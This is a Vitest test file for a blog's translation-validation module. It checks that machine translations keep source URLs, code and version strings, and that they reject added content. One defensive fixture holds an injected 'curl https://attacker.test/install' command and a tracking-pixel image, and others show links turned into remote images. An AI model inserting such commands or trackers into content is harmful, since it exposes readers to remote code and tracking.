import { describe, expect, it } from "vitest";
import {
  computePostTranslationSourceHash,
  validateTranslationPreservesSource,
} from "@/lib/post-translation-source";

const source = {
  title: "iOS 应用降级",
  excerpt: "条件与步骤",
  content: "## 条件\n\n公开正文",
  seoTitle: "iOS 应用降级指南",
  seoDescription: "适用条件与限制",
  seoKeywords: ["iOS 应用降级", "App Store"],
  socialTitle: null,
  socialDescription: null,
  status: "PUBLISHED",
};

describe("post translation source revisions", () => {
  it("changes when translatable source copy or publication status changes", () => {
    const base = computePostTranslationSourceHash(source);

    expect(computePostTranslationSourceHash({ ...source, content: `${source.content}\n新段落` })).not.toBe(base);
    expect(computePostTranslationSourceHash({ ...source, status: "DRAFT" })).not.toBe(base);
  });

  it("does not depend on interaction counters or Post.updatedAt", () => {
    const base = computePostTranslationSourceHash(source);
    const withInteractions = {
      ...source,
      likeCount: 99,
      commentCount: 42,
      viewCount: 1000,
      updatedAt: new Date("2027-01-01T00:00:00Z"),
    };

    expect(computePostTranslationSourceHash(withInteractions)).toBe(base);
  });

  it("rejects a translation that drops source URLs, code, or version identifiers", () => {
    const protectedSource = {
      title: "iOS 18.0 指南",
      excerpt: "保留版本和链接",
      content: "[文档](https://example.test/docs)\n\n```bash\ntool --version\n```",
    };
    expect(validateTranslationPreservesSource(protectedSource, {
      title: "iOS 18.0 Guide",
      excerpt: "Keep the version and link.",
      content: "[Docs](https://example.test/docs)\n\n```bash\ntool --version\n```",
    })).toEqual({ ok: true, missing: [], unexpected: [] });

    expect(validateTranslationPreservesSource(protectedSource, {
      title: "iOS Guide",
      excerpt: "Translated copy.",
      content: "The important source details disappeared.",
    })).toMatchObject({ ok: false, missing: expect.arrayContaining(["https://example.test/docs", "iOS 18.0"]) });
  });

  it("protects relative links, mail addresses, balanced URLs, and product version ranges", () => {
    const protectedSource = {
      title: "支持 iOS 15+ 与 Windows 11",
      excerpt: "虚拟定位支持 26.4+",
      content: [
        "![cover](/uploads/cover_(small).webp)",
        "[guide](../docs/start.md)",
        "[mail](mailto:hello@example.test)",
        "https://example.test/a_(b)",
      ].join("\n"),
    };
    const missingCopy = {
      title: "Supported systems",
      excerpt: "Compatibility details",
      content: "All protected references were removed.",
    };

    expect(validateTranslationPreservesSource(protectedSource, missingCopy)).toMatchObject({
      ok: false,
      missing: expect.arrayContaining([
        "iOS 15+",
        "Windows 11",
        "26.4+",
        "/uploads/cover_(small).webp",
        "../docs/start.md",
        "mailto:hello@example.test",
        "https://example.test/a_(b)",
      ]),
    });
  });

  it("rejects model-added links, tracking images, code, and version claims", () => {
    const protectedSource = {
      title: "iOS 18.0 指南",
      excerpt: "官方入口",
      content: "[文档](https://example.test/docs)\n\n使用 `pnpm build`。",
    };
    const injectedTranslation = {
      title: "iOS 18.0 Guide",
      excerpt: "Official entry",
      content: [
        "[Docs](https://example.test/docs)",
        "Use `pnpm build`.",
        "![tracking pixel](https://tracker.test/pixel.gif)",
        "Run `curl https://attacker.test/install` on Windows 12.",
      ].join("\n\n"),
    };

    expect(validateTranslationPreservesSource(protectedSource, injectedTranslation)).toMatchObject({
      ok: false,
      unexpected: expect.arrayContaining([
        "https://tracker.test/pixel.gif",
        "https://attacker.test/install",
        "`curl https://attacker.test/install`",
        "Windows 12",
      ]),
    });
  });

  it("does not allow a passive Markdown link to become an active remote image", () => {
    const protectedSource = {
      title: "Documentation",
      excerpt: null,
      content: "[Open documentation](https://example.test/reference)",
    };
    const trackingTranslation = {
      title: "Documentation",
      excerpt: null,
      content: "![Open documentation](https://example.test/reference)",
    };

    expect(validateTranslationPreservesSource(protectedSource, trackingTranslation)).toMatchObject({
      ok: false,
      unexpected: ["image:https://example.test/reference"],
    });
  });

  it("does not allow a reference-style link to become a remote image", () => {
    const protectedSource = {
      title: "Documentation",
      excerpt: null,
      content: "[Docs][ref]\n\n[ref]: https://example.test/reference",
    };
    const trackingTranslation = {
      title: "Documentation",
      excerpt: null,
      content: "![Docs][ref]\n\n[ref]: https://example.test/reference",
    };

    expect(validateTranslationPreservesSource(protectedSource, trackingTranslation)).toMatchObject({
      ok: false,
      unexpected: ["image:https://example.test/reference"],
    });
  });

  it("parses escaped CommonMark labels before deciding link versus image", () => {
    const protectedSource = {
      title: "Documentation",
      excerpt: null,
      content: "[Docs][ref]\n\n[ref]: https://example.test/reference",
    };
    const escapedTrackingTranslation = {
      title: "Documentation",
      excerpt: null,
      content: "![Do\\]cs][ref]\n\n[ref]: https://example.test/reference",
    };

    expect(validateTranslationPreservesSource(protectedSource, escapedTrackingTranslation)).toMatchObject({
      ok: false,
      unexpected: ["image:https://example.test/reference"],
    });
  });
});
